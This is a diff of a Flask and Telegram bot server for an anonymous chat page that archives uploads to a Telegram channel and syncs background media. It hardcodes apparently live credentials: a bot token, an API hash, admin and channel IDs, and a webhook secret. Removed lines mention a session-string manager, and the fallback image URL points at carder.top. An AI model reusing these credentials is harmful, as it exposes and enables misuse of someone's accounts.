@@ -1,411 +1,1147 @@
 import os
+import re
+import uuid
+import time
+import json
 import asyncio
+import random
+import sqlite3
 import threading
 import traceback
+import mimetypes
+from datetime import datetime, timezone
+from io import BytesIO
+from pathlib import Path
+from typing import Optional, Tuple
+
 import requests
-import time
-import random
-from flask import Flask, request, jsonify, send_file
+from flask import Flask, request, jsonify, send_file, abort
 from flask_cors import CORS
-from pyrogram import Client, filters
+from werkzeug.utils import secure_filename
+from werkzeug.exceptions import RequestEntityTooLarge
+
+try:
+    from pyrogram import Client, filters
+except ImportError:
+    Client = None
+    filters = None
+
+
+# ============================================================
+# Configuration — Credentials integrated directly
+# ============================================================
+
+BASE_DIR = Path(__file__).resolve().parent
+
+# আপনার নির্দিষ্ট ক্রেডেনশিয়ালস এখানে বসানো হলো:
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8613982412:AAGEdvZdzjK3Eli_vIYoEtXnsxZgwodqnVE").strip()
+API_ID = int(os.environ.get("API_ID", "33511945") or "33511945")
+API_HASH = os.environ.get("API_HASH", "d044392a17690c14ee5b4a23651a0700").strip()
+ADMIN_ID = int(os.environ.get("ADMIN_ID", "6034439625") or "6034439625")
+STORAGE_CHANNEL_ID = int(
+    os.environ.get("STORAGE_CHANNEL_ID", "-1004382857247")
+)
+WEBHOOK_SECRET = os.environ.get("TELEGRAM_WEBHOOK_SECRET", "my_secure_webhook_secret_123").strip()
+
+MAX_UPLOAD_MB = max(1, int(os.environ.get("MAX_UPLOAD_MB", "20")))
+MAX_CHAT_TEXT_CHARS = 3000
+CHAT_HISTORY_LIMIT_DEFAULT = 100
+CHAT_BACKUP_MARKER = "[CHAT_BACKUP]"
+CHAT_BACKUP_TEXT_MARKER = "[CHAT_BACKUP_TEXT]"
+
+DB_PATH = Path(os.environ.get("CHAT_DB_PATH", str(BASE_DIR / "chat_messages.db")))
+MEDIA_DIR = Path(os.environ.get("CHAT_MEDIA_DIR", str(BASE_DIR / "static" / "chat_media")))
+BG_DIR = Path(os.environ.get("BACKGROUND_DIR", str(BASE_DIR / "static" / "backgrounds")))
+
+MEDIA_DIR.mkdir(parents=True, exist_ok=True)
+BG_DIR.mkdir(parents=True, exist_ok=True)
+DB_PATH.parent.mkdir(parents=True, exist_ok=True)
 
 app = Flask(__name__)
+app.config["MAX_CONTENT_LENGTH"] = MAX_UPLOAD_MB * 1024 * 1024
 CORS(app)
 
-API_ID = int(os.environ.get("API_ID", 33511945))
-API_HASH = os.environ.get("API_HASH", "d044392a17690c14ee5b4a23651a0700")
-
-BOT_TOKEN = "8613982412:AAGEdvZdzjK3Eli_vIYoEtXnsxZgwodqnVE"
-OWNER_CHAT_ID = "-1003962414788"  
-ADMIN_ID = 6034439625             
-STORAGE_CHANNEL_ID = -1004382857247 
-
 active_clients = {}
-total_logged_in_users = 0  
-admin_states = {} 
+admin_states = {}
+total_logged_in_users = 0  # Kept for compatibility with older dashboard code.
 
-def send_telegram_message(chat_id, text, reply_markup=None):
+pyrogram_client = None
+pyrogram_loop = asyncio.new_event_loop()
+pyrogram_loop_ready = threading.Event()
+pyrogram_thread = threading.Thread(
+    target=lambda: _run_pyrogram_loop(),
+    name="pyrogram-background-loop",
+    daemon=True,
+)
+
+
+# ============================================================
+# SQLite chat storage
+# ============================================================
+
+def db_connect():
+    conn = sqlite3.connect(str(DB_PATH), timeout=30)
+    conn.row_factory = sqlite3.Row
+    return conn
+
+
+def init_db():
+    with db_connect() as conn:
+        conn.execute("PRAGMA journal_mode=WAL")
+        conn.execute("""
+            CREATE TABLE IF NOT EXISTS chat_messages (
+                id TEXT PRIMARY KEY,
+                client_message_id TEXT UNIQUE,
+                client_id TEXT NOT NULL,
+                sender_name TEXT NOT NULL,
+                text TEXT NOT NULL DEFAULT '',
+                media_filename TEXT,
+                media_type TEXT,
+                telegram_file_id TEXT,
+                telegram_message_id INTEGER,
+                telegram_chat_id TEXT,
+                telegram_saved INTEGER NOT NULL DEFAULT 0,
+                created_at TEXT NOT NULL
+            )
+        """)
+        conn.execute("""
+            CREATE INDEX IF NOT EXISTS idx_chat_created_at
+            ON chat_messages(created_at)
+        """)
+        conn.commit()
+
+
+def row_to_message(row):
+    if row is None:
+        return None
+
+    has_media = bool(row["media_filename"] or row["telegram_file_id"])
+
+    return {
+        "id": row["id"],
+        "client_message_id": row["client_message_id"],
+        "client_id": row["client_id"],
+        "sender_name": row["sender_name"],
+        "text": row["text"] or "",
+        "media_url": f"/api/chat/media/{row['id']}" if has_media else "",
+        "media_type": row["media_type"] or "",
+        "created_at": row["created_at"],
+        "telegram_saved": bool(row["telegram_saved"]),
+    }
+
+
+def get_message_by_id(message_id):
+    with db_connect() as conn:
+        row = conn.execute(
+            "SELECT * FROM chat_messages WHERE id = ?",
+            (message_id,)
+        ).fetchone()
+    return row
+
+
+def get_chat_stats():
+    with db_connect() as conn:
+        total_messages = conn.execute(
+            "SELECT COUNT(*) FROM chat_messages"
+        ).fetchone()[0]
+        total_clients = conn.execute(
+            "SELECT COUNT(DISTINCT client_id) FROM chat_messages"
+        ).fetchone()[0]
+    return {
+        "total_chat_messages": int(total_messages or 0),
+        "total_chat_clients": int(total_clients or 0),
+    }
+
+
+init_db()
+
+
+# ============================================================
+# Telegram Bot API helpers
+# ============================================================
+
+class TelegramAPIError(RuntimeError):
+    pass
+
+
+class TelegramNotConfiguredError(RuntimeError):
+    pass
+
+
+def telegram_api(method, data=None, files=None, timeout=(10, 120)):
+    if not BOT_TOKEN:
+        raise TelegramNotConfiguredError(
+            "BOT_TOKEN is not configured in the server environment."
+        )
+
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
+
     try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
+        response = requests.post(
+            url,
+            data=data or {},
+            files=files,
+            timeout=timeout,
+        )
+        try:
+            payload = response.json()
+        except ValueError:
+            payload = {}
+
+        if response.status_code >= 400 or not payload.get("ok"):
+            description = payload.get("description") or (
+                f"Telegram API returned HTTP {response.status_code}"
+            )
+            raise TelegramAPIError(description)
+
+        return payload.get("result", {})
+
+    except requests.RequestException as exc:
+        raise TelegramAPIError(f"Telegram network error: {exc}") from exc
+
+
+def send_telegram_message(chat_id, text, reply_markup=None, parse_mode=None):
+    try:
+        payload = {"chat_id": str(chat_id), "text": str(text)}
         if reply_markup:
-            payload["reply_markup"] = reply_markup
-        requests.post(url, json=payload, timeout=15)
-    except Exception as e:
-        print("Telegram Notification Error:", e)
+            payload["reply_markup"] = json.dumps(reply_markup)
+        if parse_mode:
+            payload["parse_mode"] = parse_mode
+        telegram_api("sendMessage", data=payload, timeout=(10, 30))
+        return True
+    except Exception as exc:
+        print("Telegram sendMessage error:", exc)
+        return False
 
-def edit_telegram_message(chat_id, message_id, text, reply_markup=None):
+
+def edit_telegram_message(chat_id, message_id, text, reply_markup=None, parse_mode=None):
     try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
         payload = {
-            "chat_id": chat_id,
-            "message_id": message_id,
-            "text": text,
-            "parse_mode": "Markdown"
+            "chat_id": str(chat_id),
+            "message_id": int(message_id),
+            "text": str(text),
         }
         if reply_markup:
-            payload["reply_markup"] = reply_markup
-        requests.post(url, json=payload, timeout=15)
-    except Exception as e:
-        print("Edit Message Error:", e)
+            payload["reply_markup"] = json.dumps(reply_markup)
+        if parse_mode:
+            payload["parse_mode"] = parse_mode
+        telegram_api("editMessageText", data=payload, timeout=(10, 30))
+        return True
+    except Exception as exc:
+        print("Telegram editMessageText error:", exc)
+        return False
+
 
 def answer_callback(callback_query_id, text, show_alert=False):
     try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
-        requests.post(url, json={"callback_query_id": callback_query_id, "text": text, "show_alert": show_alert}, timeout=10)
-    except Exception as e:
-        pass
+        telegram_api(
+            "answerCallbackQuery",
+            data={
+                "callback_query_id": callback_query_id,
+                "text": str(text),
+                "show_alert": bool(show_alert),
+            },
+            timeout=(5, 15),
+        )
+    except Exception as exc:
+        print("Telegram callback answer error:", exc)
+
+
+def get_telegram_file_id(result):
+    if not isinstance(result, dict):
+        return None
+
+    if result.get("photo"):
+        photos = result["photo"]
+        if photos:
+            return photos[-1].get("file_id")
+
+    for key in ("video", "document", "animation"):
+        item = result.get(key)
+        if isinstance(item, dict):
+            return item.get("file_id")
+
+    return None
+
+
+def send_chat_archive_to_telegram(
+    message_id: str,
+    sender_name: str,
+    text: str,
+    created_at: str,
+    client_id: str,
+    media_path: Optional[Path],
+    media_type: str,
+    original_filename: str,
+) -> Tuple[Optional[int], Optional[str], bool]:
+    """
+    Posts a website chat item to the storage channel.
+    Returns (Telegram message ID, Telegram file ID, backup_complete).
+    The [CHAT_BACKUP] marker prevents chat uploads from being synced
+    into the website's random-background collection.
+    """
+    header = (
+        f"{CHAT_BACKUP_MARKER}\n"
+        f"ID: {message_id}\n"
+        f"Sender: {sender_name}\n"
+        f"Time: {created_at}\n"
+    )
+
+    if not media_path:
+        archive_text = header + "\n" + (text or "(No text)")
+        result = telegram_api(
+            "sendMessage",
+            data={
+                "chat_id": str(STORAGE_CHANNEL_ID),
+                "text": archive_text,
+                "disable_web_page_preview": "true",
+            },
+        )
+        return result.get("message_id"), None, True
+
+    # Telegram media captions are limited; send the full text separately
+    # if it does not fit in the caption.
+    caption_limit = 950
+    available_text = max(0, caption_limit - len(header) - 2)
+    caption_text = (text or "")[:available_text]
+    caption = header + (("\n" + caption_text) if caption_text else "")
+
+    mime = (media_type or "").lower()
+    if mime.startswith("video/"):
+        method = "sendVideo"
+        upload_field = "video"
+    elif mime in ("image/jpeg", "image/png"):
+        method = "sendPhoto"
+        upload_field = "photo"
+    else:
+        # sendDocument preserves file formats not accepted by sendPhoto.
+        method = "sendDocument"
+        upload_field = "document"
+
+    with open(media_path, "rb") as file_handle:
+        result = telegram_api(
+            method,
+            data={
+                "chat_id": str(STORAGE_CHANNEL_ID),
+                "caption": caption,
+            },
+            files={
+                upload_field: (
+                    original_filename or media_path.name,
+                    file_handle,
+                    mime or "application/octet-stream",
+                )
+            },
+        )
+
+    telegram_message_id = result.get("message_id")
+    telegram_file_id = get_telegram_file_id(result)
+    backup_complete = True
+
+    # Keep long captions/text intact in the channel as a separate message.
+    if len(text or "") > len(caption_text):
+        full_text = (
+            f"{CHAT_BACKUP_TEXT_MARKER}\n"
+            f"ID: {message_id}\n"
+            f"Full message text:\n{text}"
+        )
+        try:
+            telegram_api(
+                "sendMessage",
+                data={
+                    "chat_id": str(STORAGE_CHANNEL_ID),
+                    "text": full_text,
+                    "disable_web_page_preview": "true",
+                },
+            )
+        except Exception as exc:
+            backup_complete = False
+            print("Telegram full-text backup error:", exc)
+
+    return telegram_message_id, telegram_file_id, backup_complete
+
+
+def download_telegram_file(file_id):
+    if not BOT_TOKEN or not file_id:
+        return None, None
+
+    try:
+        response = requests.get(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/getFile",
+            params={"file_id": file_id},
+            timeout=30,
+        )
+        payload = response.json()
+        if not response.ok or not payload.get("ok"):
+            print("Telegram getFile error:", payload)
+            return None, None
+
+        file_path = payload["result"]["file_path"]
+        download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
+        file_response = requests.get(download_url, timeout=60)
+
+        if not file_response.ok:
+            return None, None
+
+        return file_response.content, file_path
+
+    except Exception as exc:
+        print("Telegram file download error:", exc)
+        return None, None
+
+
+# ============================================================
+# Chat API used by naughty.html
+# ============================================================
+
+@app.route("/api/chat/messages", methods=["GET", "POST"])
+def chat_messages_api():
+    if request.method == "GET":
+        try:
+            limit = request.args.get("limit", CHAT_HISTORY_LIMIT_DEFAULT, type=int)
+            limit = max(1, min(limit or CHAT_HISTORY_LIMIT_DEFAULT, 200))
+
+            with db_connect() as conn:
+                rows = conn.execute(
+                    "SELECT * FROM chat_messages "
+                    "ORDER BY created_at DESC LIMIT ?",
+                    (limit,),
+                ).fetchall()
+
+            messages = [row_to_message(row) for row in reversed(rows)]
+            return jsonify({"ok": True, "messages": messages})
+
+        except Exception:
+            print("Chat history error:", traceback.format_exc())
+            return jsonify({"ok": False, "error": "Unable to load chat history."}), 500
+
+    # POST multipart/form-data:
+    # text, sender_name, client_id, client_message_id, media (optional)
+    text = (request.form.get("text") or "").strip()
+    client_id = (request.form.get("client_id") or "").strip()[:120]
+    client_message_id = (
+        request.form.get("client_message_id") or uuid.uuid4().hex
+    ).strip()[:120]
+
+    # Keep public chat anonymous. Do not trust a client-supplied display name.
+    sender_name = "Anonymous User"
+
+    if not client_id:
+        client_id = uuid.uuid4().hex
+
+    if len(text) > MAX_CHAT_TEXT_CHARS:
+        return jsonify({
+            "ok": False,
+            "error": f"Message text must be {MAX_CHAT_TEXT_CHARS} characters or fewer.",
+        }), 400
+
+    uploaded_file = request.files.get("media")
+    if not text and (uploaded_file is None or not uploaded_file.filename):
+        return jsonify({"ok": False, "error": "Write a message or attach a file."}), 400
+
+    if not BOT_TOKEN:
+        return jsonify({
+            "ok": False,
+            "error": "Chat storage is not configured. Set BOT_TOKEN on the server.",
+        }), 503
+
+    # Idempotency: avoid reposting a message if the browser retries after a timeout.
+    with db_connect() as conn:
+        existing = conn.execute(
+            "SELECT * FROM chat_messages WHERE client_message_id = ?",
+            (client_message_id,),
+        ).fetchone()
+
+    if existing:
+        message = row_to_message(existing)
+        return jsonify({
+            "ok": True,
+            "message": message,
+            "telegram_saved": bool(existing["telegram_saved"]),
+            "duplicate": True,
+        })
+
+    message_id = uuid.uuid4().hex
+    created_at = datetime.now(timezone.utc).isoformat(timespec="seconds")
+    media_filename = None
+    media_type = ""
+    original_filename = ""
+    media_path = None
+
+    if uploaded_file and uploaded_file.filename:
+        original_filename = secure_filename(uploaded_file.filename) or "upload"
+        media_type = (
+            uploaded_file.mimetype
+            or mimetypes.guess_type(original_filename)[0]
+            or ""
+        ).lower()
+
+        if not (media_type.startswith("image/") or media_type.startswith("video/")):
+            return jsonify({
+                "ok": False,
+                "error": "Only image and video uploads are allowed.",
+            }), 400
+
+        suffix = Path(original_filename).suffix[:12]
+        media_filename = f"{message_id}{suffix}"
+        media_path = MEDIA_DIR / media_filename
+
+        try:
+            uploaded_file.save(media_path)
+        except Exception:
+            print("Media save error:", traceback.format_exc())
+            return jsonify({"ok": False, "error": "Unable to save uploaded media."}), 500
+
+    try:
+        telegram_message_id, telegram_file_id, telegram_saved = (
+            send_chat_archive_to_telegram(
+                message_id=message_id,
+                sender_name=sender_name,
+                text=text,
+                created_at=created_at,
+                client_id=client_id,
+                media_path=media_path,
+                media_type=media_type,
+                original_filename=original_filename,
+            )
+        )
+
+        with db_connect() as conn:
+            conn.execute(
+                """
+                INSERT INTO chat_messages (
+                    id, client_message_id, client_id, sender_name, text,
+                    media_filename, media_type, telegram_file_id,
+                    telegram_message_id, telegram_chat_id, telegram_saved,
+                    created_at
+                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                """,
+                (
+                    message_id,
+                    client_message_id,
+                    client_id,
+                    sender_name,
+                    text,
+                    media_filename,
+                    media_type,
+                    telegram_file_id,
+                    telegram_message_id,
+                    str(STORAGE_CHANNEL_ID),
+                    1 if telegram_saved else 0,
+                    created_at,
+                ),
+            )
+            conn.commit()
+
+        row = get_message_by_id(message_id)
+
+        return jsonify({
+            "ok": True,
+            "message": row_to_message(row),
+            "telegram_saved": bool(telegram_saved),
+        }), 201
+
+    except TelegramNotConfiguredError as exc:
+        if media_path and media_path.exists():
+            media_path.unlink(missing_ok=True)
+        return jsonify({"ok": False, "error": str(exc)}), 503
+
+    except TelegramAPIError as exc:
+        if media_path and media_path.exists():
+            media_path.unlink(missing_ok=True)
+        print("Telegram chat backup failed:", exc)
+        return jsonify({
+            "ok": False,
+            "error": "Telegram storage failed. Please try again.",
+        }), 502
+
+    except sqlite3.IntegrityError:
+        # Another request may have stored the same client_message_id.
+        with db_connect() as conn:
+            row = conn.execute(
+                "SELECT * FROM chat_messages WHERE client_message_id = ?",
+                (client_message_id,),
+            ).fetchone()
+        if row:
+            return jsonify({
+                "ok": True,
+                "message": row_to_message(row),
+                "telegram_saved": bool(row["telegram_saved"]),
+                "duplicate": True,
+            })
+        print("Chat database integrity error:", traceback.format_exc())
+        return jsonify({"ok": False, "error": "Unable to save chat message."}), 500
+
+    except Exception:
+        print("Chat send error:", traceback.format_exc())
+        # Do not remove a file if the Telegram upload may already have succeeded.
+        return jsonify({
+            "ok": False,
+            "error": "Unexpected server error while saving the message.",
+        }), 500
+
+
+@app.route("/api/chat/media/<message_id>", methods=["GET"])
+def get_chat_media(message_id):
+    row = get_message_by_id(message_id)
+    if row is None:
+        return jsonify({"ok": False, "error": "Media not found."}), 404
+
+    media_type = row["media_type"] or "application/octet-stream"
+    media_filename = row["media_filename"]
+
+    if media_filename:
+        # Use only a basename so a database value cannot escape MEDIA_DIR.
+        local_path = MEDIA_DIR / os.path.basename(media_filename)
+        if local_path.is_file():
+            return send_file(
+                local_path,
+                mimetype=media_type,
+                conditional=True,
+                as_attachment=False,
+            )
+
+    # Fallback for deployments where local files are ephemeral or missing.
+    file_id = row["telegram_file_id"]
+    content, telegram_path = download_telegram_file(file_id)
+
+    if content is None:
+        return jsonify({
+            "ok": False,
+            "error": "Media is not available on this server.",
+        }), 404
+
+    guessed_type = mimetypes.guess_type(telegram_path or "")[0] or media_type
+    filename = Path(telegram_path or "media").name
+
+    return send_file(
+        BytesIO(content),
+        mimetype=guessed_type,
+        download_name=filename,
+        as_attachment=False,
+    )
+
+
+@app.route("/stats", methods=["GET"])
+def get_stats():
+    stats = get_chat_stats()
+    return jsonify({
+        "total_users_logged_in": total_logged_in_users,
+        **stats,
+    })
+
+
+@app.errorhandler(RequestEntityTooLarge)
+def handle_large_upload(_error):
+    return jsonify({
+        "ok": False,
+        "error": f"Upload is too large. Maximum upload size is {MAX_UPLOAD_MB} MB.",
+    }), 413
+
+
+# ============================================================
+# Website pages and background media
+# ============================================================
+
+@app.route("/", methods=["GET"])
+def home():
+    index_path = BASE_DIR / "index.html"
+    if index_path.is_file():
+        return send_file(index_path)
+    return "index.html not found", 404
+
+
+@app.route("/naughty.html", methods=["GET"])
+def naughty_page():
+    page_path = BASE_DIR / "naughty.html"
+    if page_path.is_file():
+        return send_file(page_path)
+    return "naughty.html not found", 404
+
+
+@app.route("/verify.html", methods=["GET"])
+def verify_page():
+    page_path = BASE_DIR / "verify.html"
+    if page_path.is_file():
+        return send_file(page_path)
+    return "verify.html not found", 404
+
+
+@app.route("/dashboard.html", methods=["GET"])
+def dashboard_page():
+    page_path = BASE_DIR / "dashboard.html"
+    if page_path.is_file():
+        return send_file(page_path)
+    return "dashboard.html not found", 404
+
+
+def background_file_type(filename):
+    ext = Path(filename).suffix.lower()
+    if ext in {".mp4", ".mov", ".webm", ".mkv", ".m4v"}:
+        return "video"
+    if ext in {".jpg", ".jpeg", ".png", ".webp", ".gif"}:
+        return "image"
+    return None
+
+
+@app.route("/get-random-background", methods=["GET"])
+def get_random_background():
+    BG_DIR.mkdir(parents=True, exist_ok=True)
+
+    files = [
+        name for name in os.listdir(BG_DIR)
+        if (BG_DIR / name).is_file() and background_file_type(name)
+    ]
+
+    blur_val = app.config.get("CURRENT_BLUR", "3px")
+
+    if not files:
+        return jsonify({
+            "status": "success",
+            "url": "https://carder.top/imagens/1792298157180-542085424.jpg",
+            "type": "image",
+            "blur": blur_val,
+        })
+
+    chosen_file = random.choice(files)
+    return jsonify({
+        "status": "success",
+        "url": f"/static/backgrounds/{chosen_file}?v={int(time.time())}",
+        "type": background_file_type(chosen_file),
+        "blur": blur_val,
+    })
+
 
 def download_background_file_by_id(file_id, file_name_prefix):
+    """Download a Telegram Bot API file into static/backgrounds."""
+    if not BOT_TOKEN or not file_id:
+        return False, None
+
     try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}"
-        res = requests.get(url, timeout=60).json()
-        
-        if res.get("ok"):
-            file_path = res["result"]["file_path"]
-            download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
-            
-            file_res = requests.get(download_url, stream=True, timeout=120)
-            
-            if file_res.status_code == 200:
-                bg_folder = "static/backgrounds"
-                os.makedirs(bg_folder, exist_ok=True)
-                
-                ext = file_path.split('.')[-1] if '.' in file_path else 'mp4'
-                unique_name = f"{file_name_prefix}_{int(time.time())}_{random.randint(1000,9999)}.{ext}"
-                save_path = os.path.join(bg_folder, unique_name)
-                
-                with open(save_path, "wb") as f:
-                    for chunk in file_res.iter_content(chunk_size=32768):
-                        if chunk:
-                            f.write(chunk)
-                            
-                return True, unique_name
-    except Exception as e:
-        print("Large Video Download Error:", traceback.format_exc())
-    return False, None
+        response = requests.get(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/getFile",
+            params={"file_id": file_id},
+            timeout=30,
+        )
+        payload = response.json()
+
+        if not response.ok or not payload.get("ok"):
+            print("Background getFile error:", payload)
+            return False, None
+
+        telegram_path = payload["result"]["file_path"]
+        ext = Path(telegram_path).suffix.lower()
+
+        if ext not in {
+            ".mp4", ".mov", ".webm", ".mkv", ".m4v",
+            ".jpg", ".jpeg", ".png", ".webp", ".gif",
+        }:
+            ext = ".mp4"
+
+        download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{telegram_path}"
+        file_response = requests.get(download_url, stream=True, timeout=120)
+
+        if file_response.status_code != 200:
+            return False, None
+
+        prefix = secure_filename(file_name_prefix) or "background"
+        unique_name = f"{prefix}_{int(time.time())}_{random.randint(1000,9999)}{ext}"
+        save_path = BG_DIR / unique_name
+
+        with open(save_path, "wb") as output:
+            for chunk in file_response.iter_content(chunk_size=32768):
+                if chunk:
+                    output.write(chunk)
+
+        return True, unique_name
+
+    except Exception:
+        print("Background download error:", traceback.format_exc())
+        return False, None
+
+
+# ============================================================
+# Optional Pyrogram channel monitor for background media.
+# Chat backups are explicitly skipped.
+# ============================================================
+
+def _run_pyrogram_loop():
+    asyncio.set_event_loop(pyrogram_loop)
+    pyrogram_loop_ready.set()
+    pyrogram_loop.run_forever()
+
+
+def run_async(coro, timeout=180):
+    if not pyrogram_thread.is_alive():
+        raise RuntimeError("Pyrogram background loop is not running.")
+    if not pyrogram_loop_ready.wait(timeout=5):
+        raise RuntimeError("Pyrogram background loop did not start.")
+    future = asyncio.run_coroutine_threadsafe(coro, pyrogram_loop)
+    return future.result(timeout=timeout)
+
+
+def is_chat_backup_message(message):
+    content = (getattr(message, "caption", None) or getattr(message, "text", None) or "").strip()
+    return (
+        content.startswith(CHAT_BACKUP_MARKER)
+        or content.startswith(CHAT_BACKUP_TEXT_MARKER)
+    )
+
+
+def message_is_background_media(message):
+    if getattr(message, "photo", None):
+        return True
+    if getattr(message, "video", None):
+        return True
+    if getattr(message, "animation", None):
+        return True
+
+    document = getattr(message, "document", None)
+    if document:
+        mime = (getattr(document, "mime_type", None) or "").lower()
+        return mime.startswith("image/") or mime.startswith("video/")
+
+    return False
+
+
+async def download_background_message(client, message, prefix="channel"):
+    if is_chat_backup_message(message) or not message_is_background_media(message):
+        return False
+
+    BG_DIR.mkdir(parents=True, exist_ok=True)
+
+    media_obj = (
+        getattr(message, "video", None)
+        or getattr(message, "animation", None)
+        or getattr(message, "document", None)
+    )
+
+    original_name = getattr(media_obj, "file_name", None) if media_obj else None
+
+    if getattr(message, "photo", None):
+        original_name = original_name or f"photo_{message.id}.jpg"
+    elif getattr(message, "animation", None):
+        original_name = original_name or f"animation_{message.id}.gif"
+    elif getattr(message, "video", None):
+        original_name = original_name or f"video_{message.id}.mp4"
+    else:
+        original_name = original_name or f"media_{message.id}"
+
+    safe_name = secure_filename(os.path.basename(original_name)) or f"media_{message.id}"
+    if not Path(safe_name).suffix:
+        if getattr(message, "photo", None):
+            safe_name += ".jpg"
+        elif getattr(message, "animation", None):
+            safe_name += ".gif"
+        else:
+            safe_name += ".mp4"
+
+    target = BG_DIR / f"{secure_filename(prefix)}_{message.id}_{safe_name}"
+
+    if target.is_file():
+        return False
+
+    try:
+        downloaded = await client.download_media(message, file_name=str(target))
+        return bool(downloaded)
+    except Exception as exc:
+        print("Pyrogram background download error:", exc)
+        return False
+
+
+async def scan_storage_channel(client, limit=100):
+    synced_count = 0
+
+    async for message in client.get_chat_history(STORAGE_CHANNEL_ID, limit=limit):
+        try:
+            if await download_background_message(client, message, "channel"):
+                synced_count += 1
+        except Exception:
+            print("Channel scan item error:", traceback.format_exc())
+
+    return synced_count
+
+
+async def start_pyrogram_monitor():
+    global pyrogram_client
+
+    if Client is None or filters is None:
+        print("Pyrogram is not installed; background channel sync is disabled.")
+        return False
+
+    if not BOT_TOKEN or not API_ID or not API_HASH:
+        print("API_ID/API_HASH/BOT_TOKEN missing; Pyrogram background sync is disabled.")
+        return False
+
+    client = Client(
+        "bg_channel_monitor_session",
+        api_id=API_ID,
+        api_hash=API_HASH,
+        bot_token=BOT_TOKEN,
+        in_memory=True,
+    )
+
+    @client.on_message(filters.chat(STORAGE_CHANNEL_ID))
+    async def handle_channel_upload(_client, message):
+        try:
+            # Do not turn chat-upload backups into website backgrounds.
+            if is_chat_backup_message(message):
+                return
+            await download_background_message(_client, message, "channel")
+        except Exception:
+            print("Channel monitor error:", traceback.format_exc())
+
+    try:
+        await client.start()
+        pyrogram_client = client
+        print("Pyrogram storage-channel monitor started.")
+
+        async def initial_scan():
+            try:
+                count = await scan_storage_channel(client, limit=100)
+                print(f"Initial background sync completed: {count} new files.")
+            except Exception:
+                print("Initial channel scan error:", traceback.format_exc())
+
+        asyncio.create_task(initial_scan())
+        return True
+
+    except Exception:
+        print("Pyrogram startup error:", traceback.format_exc())
+        pyrogram_client = None
+        return False
+
 
 def pyrogram_scan_channel_sync():
-    synced_count = 0
+    if pyrogram_client is None:
+        return 0
+
     try:
-        async def _scan():
-            nonlocal synced_count
-            async with Client("pyrogram_sync_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN, in_memory=True) as client:
-                async for message in client.get_chat_history(STORAGE_CHANNEL_ID, limit=100):
-                    file_id = None
-                    if message.video: file_id = message.video.file_id
-                    elif message.document: file_id = message.document.file_id
-                    elif message.animation: file_id = message.animation.file_id
-                    elif message.photo: file_id = message.photo[-1].file_id
-                    
-                    if file_id:
-                        success, _ = download_background_file_by_id(file_id, "auto_sync")
-                        if success:
-                            synced_count += 1
-        run_async(_scan())
-    except Exception as e:
-        print("Pyrogram Scan Error:", traceback.format_exc())
-    return synced_count
+        return int(run_async(scan_storage_channel(pyrogram_client, limit=100), timeout=300))
+    except Exception:
+        print("Pyrogram scan error:", traceback.format_exc())
+        return 0
+
+
+# ============================================================
+# Telegram admin menu and webhook
+# ============================================================
 
 def get_main_menu():
     return {
         "inline_keyboard": [
-            [{"text": "📊 Total Registration Members", "callback_data": "total_members"}],
-            [{"text": "🖼️ Dashboard Background Template", "callback_data": "bg_template"},
-             {"text": "💧 Blur Effect", "callback_data": "blur_effect_menu"}],
-            [{"text": "🔄 Reload & Sync All Videos", "callback_data": "reload_all_videos"}],
-            [{"text": "🔐 Session String Manager", "callback_data": "session_manager"}]
+            [{"text": "📊 Chat Statistics", "callback_data": "total_members"}],
+            [
+                {"text": "🖼️ Dashboard Background Template", "callback_data": "bg_template"},
+                {"text": "💧 Blur Effect", "callback_data": "blur_effect_menu"},
+            ],
+            [{"text": "🔄 Reload & Sync Background Media", "callback_data": "reload_all_videos"}],
         ]
     }
+
 
 def get_blur_menu():
     return {
         "inline_keyboard": [
             [
-                {"text": "2%", "callback_data": "blur_2"},
-                {"text": "3%", "callback_data": "blur_3"},
-                {"text": "4%", "callback_data": "blur_4"}
+                {"text": "2px", "callback_data": "blur_2"},
+                {"text": "3px", "callback_data": "blur_3"},
+                {"text": "4px", "callback_data": "blur_4"},
             ],
             [
-                {"text": "5%", "callback_data": "blur_5"},
-                {"text": "6%", "callback_data": "blur_6"},
-                {"text": "7%", "callback_data": "blur_7"}
+                {"text": "5px", "callback_data": "blur_5"},
+                {"text": "6px", "callback_data": "blur_6"},
+                {"text": "7px", "callback_data": "blur_7"},
             ],
-            [{"text": "🔙 Back to Main Menu", "callback_data": "back_to_main"}]
+            [{"text": "🔙 Back to Main Menu", "callback_data": "back_to_main"}],
         ]
     }
+
 
 def get_welcome_text():
     return (
-        "👋 Welcome to User Info Robot! 🌐\n\n"
-        "Manage your website backgrounds and monitor user activity.\n"
-        "👇 Select an option below to continue."
+        "👋 Welcome to the Website Admin Bot!\n\n"
+        "Manage dashboard backgrounds and view chat statistics.\n"
+        "Choose an option below."
     )
 
+
 def get_back_button():
-    return {
-        "inline_keyboard": [
-            [{"text": "🔙 Back", "callback_data": "back_to_main"}]
-        ]
-    }
+    return {"inline_keyboard": [[{"text": "🔙 Back", "callback_data": "back_to_main"}]]}
 
-bg_loop = asyncio.new_event_loop()
-def start_background_loop(loop):
-    asyncio.set_event_loop(loop)
-    
-    print("🔄 Initial startup background media sync from storage channel...")
-    pyrogram_scan_channel_sync()
-    
-    try:
-        bot_client = Client("bg_channel_monitor_session", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN, in_memory=True)
-        
-        @bot_client.on_message(filters.chat(STORAGE_CHANNEL_ID))
-        async def handle_channel_upload(client, message):
-            try:
-                file_id = None
-                if message.video: file_id = message.video.file_id
-                elif message.document: file_id = message.document.file_id
-                elif message.animation: file_id = message.animation.file_id
-                elif message.photo: file_id = message.photo[-1].file_id
-                
-                if file_id:
-                    download_background_file_by_id(file_id, "channel_synced")
-            except Exception as e:
-                print("Channel Monitor Sync Error:", e)
-        
-        bot_client.start()
-    except Exception as e:
